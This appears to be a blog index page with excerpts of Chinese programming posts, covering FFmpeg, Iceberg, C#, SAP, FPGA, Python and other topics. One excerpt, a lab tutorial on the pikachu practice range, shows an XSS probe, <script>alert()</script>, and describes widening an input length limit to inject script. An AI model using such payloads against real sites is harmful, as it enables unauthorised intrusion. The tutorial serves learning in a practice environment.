			<a href="/posts/53c0383ba85f09a281a19884eb23ae38/" rel="bookmark">
			【FFmpeg实战】ffmpeg播放器-音视频解码流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		音视频介绍 音视频解码流程 FFmpeg解码的数据结构说明 AVFormatContext：封装格式上下文结构体,全局结构体,保存了视频文件封装格式相关信息AVInputFormat：每种封装格式，对应一个该结构体AVStream[0]：视频文件中每个视频（音频）流对应一个该结构体AVCodecContext：编码器上下文结构体，保存了视频（音频）编解码相关信息AVCodec：每种视频（音频）编解码器(例如H.264解码器)对应一个该结构体 AVFormatContext数据结构说明 iformat：输入视频的AVInputFormatnb_streams：输入视频的AVStream 个数streams：输入视频的AVStream []数组duration：输入视频的时长（以微秒为单位）bit_rate：输入视频的码率 AVInputFormat数据结构说明 name：封装格式名称long_name：封装格式的长名称extensions：封装格式的扩展名id：封装格式ID一些封装格式处理的接口函数 AVStream数据结构说明 id：序号codec：该流对应的AVCodecContexttime_base：该流的时基avg_frame_rate：该流的帧率 AVCodecContext数据结构说明 codec：编解码器的AVCodecwidth, height：图像的宽高pix_fmt：像素格式sample_rate：音频采样率channels：声道数sample_fmt：音频采样格式 AVCodec数据结构说明 name：编解码器名称long_name：编解码器长名称type：编解码器类型id：编解码器ID一些编解码的接口函数 AVPacket数据结构说明 pts：显示时间戳dts：解码时间戳data：压缩编码数据size：压缩编码数据大小stream_index：所属的AVStream AVFrame数据结构说明 data：解码后的图像像素数据（音频采样数据）linesize：对视频来说是图像中一行像素的大小；对音频来说是整个音width, height：图像的宽高key_frame：是否为关键帧pict_type：帧类型（只针对视频） 。例如I，P，B 音视频实战 将编译好的FFmpeg库考入到工程 编写CMakeLists.txt cmake_minimum_required(VERSION 3.4.1) file(GLOB source_file *.cpp) message("source_file = ${source_file}") add_library( z-player SHARED ${source_file}) include_directories(${CMAKE_SOURCE_DIR}/include) set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -L${CMAKE_SOURCE_DIR}/libs/${CMAKE_ANDROID_ARCH_ABI}") find_library( log-lib log) target_link_libraries( z-player # 方法一：使用-Wl 忽略顺序 # -Wl,--start-group #忽略顺序引发的错误 # avcodec avfilter avformat avutil swresample swscale # -Wl,--end-group # 方法二：调整顺序 avformat avcodec avfilter avutil swresample swscale #必须要把avformat放在avcodec的前面 ${log-lib} z) 这里target_link_libraries方法有两个问题：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53c0383ba85f09a281a19884eb23ae38/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c96b437710718e4ceee43b9c2a403184/" rel="bookmark">
			Iceberg学习笔记（1）—— 基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Iceberg是一个面向海量数据分析场景的开放表格式（Table Format），其设计的目的是解决数据存储和计算引擎之间的适配的问题
表格式（Table Format）可以理解为元数据以及数据文件的一种组织方式，处于计算框架（Flink，Spark...）之下，数据文件之上
概述 iceberg的特性 数据存储、计算引擎插件化：Iceberg提供一个开放通用的表格式（Table Format）实现方案，不和特定的数据存储、计算引擎绑定实时流批一体：Iceberg上游组件将数据写入完成后，下游组件及时可读，可查询。可以满足实时场景。并且Iceberg同时提供了流/批读接口、流/批写接口。可以在同一个流程里, 同时处理流数据和批数据，大大简化了ETL链路数据表演化（Table Evolution）：Iceberg可以通过SQL的方式进行表级别模式演进；不存在读出数据重新写入或者迁移数据这种费时费力的操作（比如在常用的Hive中，如果我们需要把一个按天分区的表，改成按小时分区。此时，不能再原表之上直接修改，只能新建一个按小时分区的表，然后再把数据Insert到新的小时分区表。而且，即使我们通过Rename的命令把新表的名字改为原表，使用原表的上次层应用, 也可能由于分区字段修改，导致需要修改 SQL，这样花费的经历是非常繁琐的）模式演化（Schema Evolution）： ADD：向表或者嵌套结构增加新列Drop：从表中或者嵌套结构中移除一列Rename：重命名表中或者嵌套结构中的一列Update：将复杂结构(struct, map&lt;key, value&gt;, list)中的基本类型扩展类型长度, 比如tinyint修改成int.Reorder：改变列或者嵌套结构中字段的排列顺序 重点：一个元数据操作, 不会涉及到重写数据文件的过程
具体表现为：
①增加列时候，不会从另外一个列中读取已存在的的数据
②删除列或者嵌套结构中字段的时候，不会改变任何其他列的值
③更新列或者嵌套结构中字段的时候，不会改变任何其他列的值
④改变列列或者嵌套结构中字段顺序的时候，不会改变相关联的值
实现方式：在表中Iceberg 使用唯一ID来定位每一列的信息；新增一个列的时候，会新分配给它一个唯一ID， 并且绝对不会使用已经被使用的ID
使用唯一ID定位，避免了使用名称定位会重复、使用位置定位无法修改顺序的缺点
分区演化：Iceberg table partitioning can be updated in an existing table because queries do not reference partition values directly（可以直接在表上修改分区策略，因为查询不和分区数据直接关联） 当我们改变一个表的分区策略时，对应修改分区之前的数据不会改变, 依然会采用老的分区策略，新的数据会采用新的分区策略，也就是说同一个表会有两种分区策略，旧数据采用旧分区策略，新数据采用新新分区策略， 在元数据里两个分区策略相互独立，不重合
借助Iceberg的隐藏分区（Hidden Partition），在写SQL 查询的时候，不需要在SQL中特别指定分区过滤条件，Iceberg会自动分区，过滤掉不需要的数据；Iceberg分区演化操作同样是一个元数据操作, 不会重写数据文件
列顺序演化（Sort Order Evolution）：Iceberg可以在一个已经存在的表上修改排序策略。修改了排序策略之后, 旧数据依旧采用老排序策略不变。往Iceberg里写数据的计算引擎总是会选择最新的排序策略, 但是当排序的代价极其高昂的时候, 就不进行排序了隐藏分区（Hidden Partition）： Iceberg的分区字段/策略（通过某一个字段计算出来），可以不是表的字段和表数据存储目录；在建表或者修改分区策略之后，新的数据会自动计算所属于的分区。在查询的时候同样不用关心表的分区是什么字段/策略，只需要关注业务逻辑，Iceberg会自动过滤不需要的分区数据 Iceberg的分区信息和表数据存储目录是独立的，因此Iceberg的表分区可以被修改,而且不涉及到数据迁移
镜像数据查询（Time Travel）：Iceberg提供了查询表历史某一时间点数据镜像（snapshot）的能力。通过该特性可以将最新的SQL逻辑，应用到历史数据上支持事务（ACID）：Iceberg通过提供事务（ACID）的机制，使其具备了upsert的能力并且使得边写边读成为可能，从而数据可以更快的被下游组件消费。通过事务保证了下游组件只能消费已commit的数据，而不会读到部分甚至未提交的数据基于乐观锁的并发支持：Iceberg基于乐观锁提供了多个程序并发写入的能力并且保证数据线性一致文件级数据剪裁：Iceberg的元数据里面提供了每个数据文件的一些统计信息，比如最大值，最小值，Count计数等等。因此，查询SQL的过滤条件除了常规的分区，列过滤，甚至可以下推到文件级别，大大加快了查询效率 不同数据湖框架的对比 iceberg不支持索引
存储结构 数据文件 data files：数据文件是Apache Iceberg表真实存储数据的文件，一般是在表的数据存储目录的data目录下，如果我们的文件格式选择的是parquet,那么文件是以“.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c96b437710718e4ceee43b9c2a403184/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99d6366b0b8c59c67d77177e6d465143/" rel="bookmark">
			XSS 漏洞挖掘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		XSS 漏洞挖掘 文章目录 XSS 漏洞挖掘漏洞挖掘 漏洞挖掘 //有输入框的地方就可以尝试一下输入 js 语言 &lt;script&gt;alert()&lt;/script&gt; 但是在真实环境中由于对方服务器可能存在waf，直接输入script标签会被对方封禁ip，所以需要测试存在漏洞与否。
接下来我们以pikachu 靶场为例
输入一个球星
我们这里输入科比时发现他给我们原样返回了，我们可以看一下源码文件
这样我们就可以判断出存在xss漏洞了，直接js语句安排
因为有限制长度为20，我们需要把限制放大才可以输入
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41651ed50f8017dad8a62274ad096c1f/" rel="bookmark">
			C#关于TimeSpan结构的使用和获取两个时间差
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C#中的TimeSpan结构可以获取两个时间的时间差。
它主要具有以下属性和方法：
属性：
Days：获取时间间隔的天数部分。Hours：获取时间间隔的小时数部分（不包括整天的小时数）。Minutes：获取时间间隔的分钟数部分（不包括整小时的分钟数）。Seconds：获取时间间隔的秒数部分（不包括整分钟的秒数）。Milliseconds：获取时间间隔的毫秒数部分（不包括整秒的毫秒数）。Ticks：获取时间间隔的刻度数，每刻度等于一百纳秒。TotalDays：获取时间间隔的总天数，包括天数、小时、分钟、秒和毫秒。TotalHours：获取时间间隔的总小时数，包括小时、分钟、秒和毫秒。TotalMinutes：获取时间间隔的总分钟数，包括分钟、秒和毫秒。TotalSeconds：获取时间间隔的总秒数，包括秒和毫秒。 方法：
Add(TimeSpan)：将指定的时间间隔添加到当前时间间隔。Subtract(TimeSpan)：从当前时间间隔减去指定的时间间隔。Duration()：获取时间间隔的绝对值。Negate()：将时间间隔的值更改为相反数。ToString()：将时间间隔转换为字符串表示形式。 例：
TimeSpan timeSpan = new TimeSpan(1, 2, 30, 45, 500); // 1天、2小时、30分钟、45秒、500毫秒 Console.WriteLine("Days: " + timeSpan.Days); // 输出：1 Console.WriteLine("Hours: " + timeSpan.Hours); // 输出：2 Console.WriteLine("Minutes: " + timeSpan.Minutes); // 输出：30 Console.WriteLine("Seconds: " + timeSpan.Seconds); // 输出：45 Console.WriteLine("Milliseconds: " + timeSpan.Milliseconds); // 输出：500 Console.WriteLine("Ticks: " + timeSpan.Ticks); // 输出：978455000000 Console.WriteLine("TotalDays: " + timeSpan.TotalDays); // 输出：1.10434027777778 Console.WriteLine("TotalHours: " + timeSpan.TotalHours); // 输出：26.5041666666667 Console.WriteLine("TotalMinutes: " + timeSpan.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41651ed50f8017dad8a62274ad096c1f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34a2c9defc1e6ac32be81a2a9d251689/" rel="bookmark">
			Loading material master sales text by LSMW with Direct Input
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Loading material master sales text by LSMW with Direct Input
In one SAP project, I need to load material master data ‘Sales Text’ view according to the requirement of business team.
So I prepared a LSMW tool in order to support the data loading. Below is the description of the key steps of this LSMW tool.
1,Maintian Object Attributes
Object Type and Import Method: select ‘Standard Batch/Direct Input’.
Object:0020
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34a2c9defc1e6ac32be81a2a9d251689/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/458811e54b5367d7310e1298732988fb/" rel="bookmark">
			【实验五】触发器电路仿真与硬件实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验要求： 1、首先用 multisim （或logsim）采用门电路或者74LSxx系列设计基本RS、D触发器，进行仿真，写成真值表。
2、在控制台上，用硬件联线完成SR触发器、D触发器的实际电路，对真值表进行验证并记录。
二、实验设计 1.RS锁存器 （1）Logsim仿真 RS锁存器特征表
RSQ00110000保持上一个状态11禁止、不稳状态 RS锁存器是时序电路的基础。基本的RS锁存器可以用两个与非门或或非门实现，由于没有74LS02芯片，这里使用与非门实现RS锁存器。
其原理图如下所示。
输入端：
R：复位端(Reset)
S：置位端(Set)
输出端：
Q：状态输出端
Q’：反相状态输出端
在Logsim的仿真电路图如下：
仿真后的真值表为：
RSQQ’0110100111维持上一个状态维持上一个状态0011 R-S触发器结论 1.R、S的有效电平是低电平。
2.不论现态如何，在R端输出低电平能将现态强制性地转换到“0”态；
在S端输出低电平能将现态强制性地转换到“1”态；
R和S不能同时事假低电平。
引入74LS00芯片后电路图如下：
（2）控制台接线 接好后的逻辑真值表与仿真结果一致。
2.D触发器 RS触发器当输入端均为1是，输出为不确定的状态。为解决这一问题，引入D触发器。
（1）Logsim仿真 下图是D触发器的原理图，目的是解决输入的约束问题。
工作原理：
CP=0 : 时钟封锁G3，G4；致使D的变化不能传入G1，G2。触发器保持现态。CP=1：时钟封锁解除，D的变化传入G1，G2。若D=0，Q=0；若D=1，则Q=1； 理论逻辑真值表如下：
CPDQ00保持不变01保持不变100111 logsim仿真电路图如下所示：
符合理论逻辑真值表。
引入74LS00后如下：
D触发器结论 1.当CP=0时，无论如何改变D，输出都不会被改变。
2.当CP=1时，输出随D的改变而改变，D是多少输出就是多少。
（2）控制台接线 三、拓展与延伸 为了解决D触发器“空翻”的问题，这里引入维持阻塞D触发器。
效果：
当且仅当CP的上升沿出现的一瞬间，D的数据才能置入触发器。
其原理图如下：
logsim仿真电路图如下：
四、实验小结 1.在根据各个输入的电平判断输出电平时，要注意是否有CP封锁。
2.在CP未封锁时，只要R为低电平就是“0”，S为高电平就转换“1”。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbb625652b550c60dc296d11cc0d49cd/" rel="bookmark">
			android报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（gradle版本：7.5-all.zip; gradle插件：7.4.2；java:11) 报错1： java.lang.IllegalArgumentException: Can only use lower 16 bits for requestCode
2023-11-20 19:39:39.207 22390-22390 AndroidRuntime com.iflytek.voicedemo FATAL EXCEPTION: main Process: com.iflytek.voicedemo, PID: 22390 java.lang.IllegalArgumentException: Can only use lower 16 bits for requestCodeat androidx.fragment.app.FragmentActivity.checkForValidRequestCode at androidx.fragment.app.FragmentActivity.validateRequestPermissionsRequestCode(FragmentActivity.java:730) at androidx.core.app.ActivityCompat.requestPermissions(ActivityCompat.java:514) at androidx.activity.ComponentActivity$2.onLaunch(ComponentActivity.java:190) 报错信息处理：在build.gradle文件依赖中添加以下代码：
implementation 'androidx.appcompat:appcompat:1.3.1' 即可解决。
报错2： loadLibrary msc error:java.lang.UnsatisfiedLinkError: dlopen failed: library "libmsc.so" not found
我使用的模拟器是x86的，但科大讯飞的语音合成只支持arm，配置如下即可：
android { ... defaultConfig { ... ndk { // 设置支持的SO库架构 abiFilters 'armeabi-v7a', 'arm64-v8a' } } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbb625652b550c60dc296d11cc0d49cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1240956228b9d7a4099a4219af06a02a/" rel="bookmark">
			Idea2023 Springboot web项目正常启动,页面展示404解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Idea2023 Springboot web项目正常启动,页面展示404解决办法 问题： 项目启动成功，但是访问网页，提示一直提示重定向次数过多，404
解决方法
在IDEA的Run/Debug Configurations窗口下当前的Application模块的Working directory中添加 M O D U L E W O R K I N G D I R MODULE_WORKING_DIR MODULEW​ORKINGD​IR ，重启项目后正常访问！
点击Edit Configurations…
点击一下Modify options
选中Working directory，之后值选择$MODULE_WORKING_DIR$即可
参考链接：https://blog.csdn.net/weixin_44085798/article/details/128160338
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0edc947ce8c61c6ddcd749909222331c/" rel="bookmark">
			python元类Type和Object的关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 python中，一切皆是对象，包括具体的数据，类型，类，函数等；__class__用于获取对象是属于那个类;__bases__用于获取对象的超类有那些;不要混淆继承关系，和数据对象的实例化关系，这是两回事 普通的数据对象int,str,float等 print(int(1).__class__) # &lt;class 'int'&gt; print(int.__class__) # &lt;class 'type'&gt; print(int.__bases__) # (&lt;class 'object'&gt;,) print(str('abc').__class__) # &lt;class 'str'&gt; print(str.__class__) # &lt;class 'type'&gt; print(str.__bases__) # (&lt;class 'object'&gt;,) 结论1： 常规的类或者类型对象，其归属的类都是type(实例化关系)，但是超类或者说父类都是直接或者间接继承自object(继承关系) 对于普通的数据如具体的数字1，字符串“abc”等对象，或者是实例化的数据，其归属的类就就是创建它的对应的类，如int(1)归属于的类是int，str(‘abc’)归属的类是str 普通的类 类也是一种对象，是一种特殊的对象，也是由更高一级别的类实例化而来，也就是创建类的类，即 元类,也就是type;
a = A() print(a.__class__) # &lt;class '__main__.A'&gt; # 实例化对象a归属的类就是类A(实例化关系) print(A.__class__) # &lt;class 'type'&gt; # 类A本身归属的类是type，这和上面的str,int等都是一样的(实例化关系) print(A.__bases__) # (&lt;class 'object'&gt;,) # 类A直接继承自Object，其超类是Object(继承关系) b = B() print(b.__class__) # &lt;class '__main__.B'&gt; # 实例化对象b，归属的类是B(实例化关系) print(B.__class__) # &lt;class 'type'&gt; # 类对象B本身，归属属的类是type，和上面的int,str是一样的(实例化关系） print(B.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0edc947ce8c61c6ddcd749909222331c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c44eedd9c05ed9dbfb8f85c8961e2e2/" rel="bookmark">
			Vivado 下 IP核之双端口 RAM 读写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Vivado 下 IP核之双端口 RAM 读写
1、RAM IP 核简介
2、实验任务
3、程序设计
3.1、RAM IP 核配置
3.2、顶层模块设计
（1）绘制波形图
4、编写代码
4.1、顶层模块 ip_2port_ram
4.2、RAM 写模块设计
4.3、ram_wr 模块代码
4.4、RAM 读模块设计
4.5、ram_rd 模块代码
5、仿真验证
5.1、编写 TB 文件
5.2、仿真验证
6、下载验证
6.1、引脚约束
6.2、添加 ILA IP 核进行在线调试
6.3、上板验证
7、本章总结
Vivado 下 IP核之双端口 RAM 读写 1、RAM IP 核简介 双端口 RAM 是指拥有两个读写端口的 RAM，有伪双端口 RAM（一个端口只能读，另一个端口只能写）和真双端口 RAM（两个端口都可以进行读写操作）之分。一般当我们需要同时对存储器进行读写操作时会使用到双端口 RAM，例如有一个 FIFO 存储器，我们需要同时对其进行数据的写入和读出，这时候就需要一个写端口和一个读端口了。接下来我们看下双端口 RAM 的框图。 在上一章中我们介绍过了单端口 RAM 的框图，本章将带着大家一起了解一下双端口 RAM 的框图，为 了方便大家进行对比，这里我们将上一章介绍的单端口 RAM 的框图也展示出来，如下图所示：
首先介绍的是简单双端口（也称为伪双端口）RAM，需要注意的是简单双端口 RAM 的端口 A 只能写不能读，端口 B 只能读不能写。BMG IP 核配置成简单双端口 RAM 的框图如下图所示。 与单端口 RAM 不同的是， 伪双端口 RAM 输入有两路时钟信号 CLKA/CLKB；独立的两组地址信号 ADDRA/ADDRB；Port A 仅提供 DINA 写数据总线，作为数据的写入口；Port B 仅提供数据读的功能，读出的数据为 DOUTB。这里我们仅对新出现的信号进行讲解，其它信号在单端口 RAM 中已经讲解过了，其中不同端口的同名（同功能）信号以 A 和 B 做为区分，各个新端口（这些信号很少使用，我们一般不用关注）的功能描述如下： INJECTSBITERR：Inject Single-Bit Error 的简写，即注入单 bit 错误，仅适用于 Xilinx Zynq-7000 和 7 系列芯片的 ECC 配置。 INJECTDBITERR：Inject Double-Bit Error 的简写，即注入双 bit 错误，同样仅适用于 Xilinx Zynq-7000 和 7 系列芯片的 ECC 配置。 SBITERR：Single-Bit Error 的简写，即单 bit 错误，标记内存中存在的单 bit 错误，该错误已在输出总线上自动更正。 DBITERR：Double-Bit Error 的简写，即双 bit 错误，标记内存中存在双 bit 错误，需要注意的是内置的ECC 解码模块不能自动纠正双 bit 错误。 RDADDRECC：Read Address for ECC Error output 的简写，即读地址 ECC 错误输出，同样仅适用于 Xilinx Zynq-7000 和 7 系列芯片的 ECC 配置。 接着介绍一下真双端口 RAM，其两个端口（A 和 B）均可进行读/写操作。BMG IP 核配置成真双端口 RAM 的框图如下图所示。 真双端口 RAM 提供了两个独立的读写端口（A 和 B），既可以同时读，也可以同时写，也可以一个读一个写。通过框图对比可以发现，真双端口 RAM 只是将单端口 RAM 的所有信号做了一个复制处理，不同端口的同一信号以 A 和 B 作为区分，所以这里我们就不再赘述各个端口的功能了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c44eedd9c05ed9dbfb8f85c8961e2e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aae4cec5f8034845fbff4e9c81b94731/" rel="bookmark">
			初阶结构体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 结构体的声明
1.1 结构的基础知识
1.2 结构的声明
1.3 结构成员的类型
1.4 结构体变量的定义和初始化
2. 结构体成员的访问
3. 结构体传参
1. 结构体的声明 1.1 结构的基础知识 结构是一些值的集合，这些值称为成员变量。结构的每个成员可以是不同类型的变量。
1.2 结构的声明 struct tag { member-list; //成员变量列表 }variable-list; //变量别表 struct Stu { //学生相关属性 char name[20]; int age; char sex[5]; char tele[12]; };s3,s4; //s3,s4是结构体类型的变量 //s3,s4是全局的 int main() { struct Stu s1; struct Stu s2; //s1,s2是结构体类型的变量，是局部变量 return 0; } 1.3 结构成员的类型 结构的成员可以是标量、数组、指针，甚至是其他结构体。
struct B { char c; int i; }; struct S { char c; int num; int arr[10]; double* pd; struct B sb; struct B* pb; }; int main() { return 0; } 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aae4cec5f8034845fbff4e9c81b94731/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a3b60a823435dd5f15365de2e0b8530/" rel="bookmark">
			离线安装Linux包的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sklearn库安装方法（有详细步骤流程）
离线安装Linux包的方法——以sklearn为例
https://pypi.org/project/scikit-learn
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9197b635112e241d9ab5c64b0efc056/" rel="bookmark">
			【02】OpenCv C#——OpenCvSharp编程入门与矩阵Mat的基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C#，OpenCv开发指南（02）——OpenCvSharp编程入门与矩阵Mat的基础知识
文章目录 1 认识 OpenCV 矩阵Mat的属性 Attributes1.1 一段关于Mat属性的代码1.4 属性和常量方法的解释1.4.7 Depth()1.4.8 ElemSize() and ElemSize1()1.4.9 Step() and Step1() 1.5 Mat Type 的定义 2 创建 Mat 实例2.1 从数据（数组）创建 Mat2.4 一些特殊的矩阵2.4.1 单位矩阵2.4.2 全0矩阵2.4.3 全1矩阵 3 访问矩阵元素（图片像素）的多种方法3.1 Get/Set (slow)3.2 GenericIndexer (reasonably fast)3.3 TypeSpecificMat (faster) 4 矩阵与其他图片数据的转换4.1 Mat -&gt; System.Drawing.Bitmap4.2 System.Drawing.Bitmap -&gt; Mat4.3 Mat -&gt; byte[]4.4 彩色图转灰度图或其他 1 认识 OpenCV 矩阵Mat的属性 Attributes 1.1 一段关于Mat属性的代码 using System; using System.IO; using System.Text; using System.Collections.Generic; using System.Windows.Forms; using System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c9197b635112e241d9ab5c64b0efc056/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/135018fef9b5e33853a42ab54bf37f85/" rel="bookmark">
			【ARM 嵌入式 编译 Makefile 系列 2.1 - Makefile info，warn, error 打印详细介绍】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		请阅读【ARM GCC Makefile 编译专栏导读】
文章目录 Makefile 解析阶段的打印函数Makefile 中如何打印变量？Makefile 中如何打印字符串？ Makefile 解析阶段的打印函数 在Makefile中，除了使用echo命令打印信息外，还可以使用$(info )，$(warning )和$(error )函数。
$(info )：这个函数用于在解析Makefile时打印一些信息。它不会像echo那样等到目标被执行时才打印，而是在Makefile解析时就会打印。例如：
$(info "Start parsing the makefile") all: @echo "Compiling the program..." 这将在make all命令执行之前就打印出"Start parsing the makefile"。
$(warning )：这个函数用于在解析Makefile时打印一些警告信息，并继续解析和执行。例如：
$(warning "This is a warning") all: @echo "Compiling the program..." 这将在解析Makefile时打印出"This is a warning"，然后继续解析和执行。
$(error )：这个函数用于在解析Makefile时打印一些错误信息，并停止解析和执行。例如：
$(error "This is an error") all: @echo "Compiling the program..." 这将在解析Makefile时打印出"This is an error"，然后停止解析和执行。$(error )函数通常用于在某些条件不满足时停止Makefile的执行。
注意，这三个函数都是在 Makefile 解析阶段，而不是目标执行阶段打印信息的，所以它们通常用于打印一些Makefile本身的信息，而不是目标的执行结果。
Makefile 中如何打印变量？ 在Makefile中，我们可以使用$(info )函数或echo命令来打印变量的值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/135018fef9b5e33853a42ab54bf37f85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5290c4bd55b3e6089d58fc9caf6babde/" rel="bookmark">
			简单登录注册页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;登录/注册&lt;/title&gt; &lt;style&gt; body { background-color: #f2f2f2; } form { background-color: #fff; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); padding: 20px; width: 300px; margin: 0 auto; margin-top: 100px; } input[type="text"], input[type="password"] { border-radius: 3px; border: 1px solid #ccc; box-sizing: border-box; font-size: 16px; margin-bottom: 10px; padding: 10px; width: 100%; } input[type="submit"] { background-color: #4CAF50; border: none; border-radius: 3px; color: #fff; cursor: pointer; font-size: 16px; padding: 10px; width: 100%; } input[type="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5290c4bd55b3e6089d58fc9caf6babde/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86e1aed0c49d540d636ef0cdc1f589b7/" rel="bookmark">
			一个以Direct Input来实现的物料主数据Sales Text的LSMW导入工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一个以Direct Input来实现的物料主数据Sales Text的LSMW导入工具
笔者在项目上由于销售部门业务人员有使用到Sales Text,所以笔者导入物料主数据的时候需要为其导入Sales Text.
导入物料的Sales Text看起来很简单，其实不然。笔者有尝试以录屏方式制作LSMW工具来导入，却遇到了如下的报错，
非常莫名其妙！笔者尝试过以background以及foreground的方式执行相关的session,但是都不成功！上网查资料，没有能找到有用的信息来解决这个报错。
时间关系，笔者不打算过于纠结为啥有这个报错，放弃录屏方式导入Sales Text, 改为Batch Input的方式来制作LSMW工具。
该工具的主要参数设置如下说明：
1,Object Attributes
Object:0020
Method:0000
Program name:RMDATIND
2, Source Structures
3,Source fields
4, Structure Relations
记得要为BMMH7指派Source Structure.
5, Field Mapping and Conversion Rules
Tcode可以是MM01，一些情况下是MM02.
结构BMMH7,
TDID很重要，很关键，它的值应该是固定值0001.
6,准备好数据，执行完之后，Sales Text就维护好了！
-完-
写于2023-11-20.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0f4a9e5336f2a91144c767a45f26197/" rel="bookmark">
			内容安全基础原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、反病毒（AV）。 定义： 病毒是一种恶意代码，可感染或附着在应用程序或文件中，一般通过邮件或文件共享等协议进行传播，威胁用户主机和网络的安全。有些病毒会耗尽主机资源、占用网络带宽，有些病毒会控制主机权限、窃取数据，有些病毒甚至会对主机硬件造成破坏。
反病毒是一种安全机制，它可以通过识别和处理病毒文件来保证网络安全，避免由病毒文件而引起的数据破坏、权限更改和系统崩溃等情况的发生。
目的： 随着网络的不断发展和应用程序的日新月异，企业用户越来越频繁地开始在网络上传输和共享文件，随之而来的病毒威胁也越来越大。企业只有拒病毒于网络之外，才能保证数据的安全，系统的稳定。因此，保证计算机和网络系统免受病毒的侵害，让系统正常运行便成为企业所面临的一个重要问题。
反病毒功能可以凭借庞大且不断更新的病毒特征库有效地保护网络安全，防止病毒文件侵害系统数据。将病毒检测设备部署在企业网的入口，可以真正将病毒抵御于网络之外，为企业网络提供了一个坚固的保护层。
2、入侵防御（IPS）。 定义： 入侵防御是一种安全机制，通过分析网络流量，检测入侵（包括缓冲区溢出攻击、木马、蠕虫等），并通过一定的响应方式，实时地中止入侵行为，保护企业信息系统和网络架构免受侵害。
优势： 实时阻断攻击：设备采用直路方式部署在网络中，能够在检测到入侵时，实时对入侵活动和攻击性网络流量进行拦截，将对网络的入侵降到最低。
深层防护：新型的攻击都隐藏在TCP/IP协议的应用层里，入侵防御能检测报文应用层的内容，还可以对网络数据流重组进行协议分析和检测，并根据攻击类型、策略等确定应该被拦截的流量。
全方位防护：入侵防御可以提供针对蠕虫、病毒、木马、僵尸网络、间谍软件、广告软件、CGI（Common Gateway Interface）攻击、跨站脚本攻击、注入攻击、目录遍历、信息泄露、远程文件包含攻击、溢出攻击、代码执行、拒绝服务、扫描工具、后门等攻击的防护措施，全方位防御各种攻击，保护网络安全。
内外兼防：入侵防御不但可以防止来自于企业外部的攻击，还可以防止发自于企业内部的攻击。系统对经过的流量都可以进行检测，既可以对服务器进行防护，也可以对客户端进行防护。
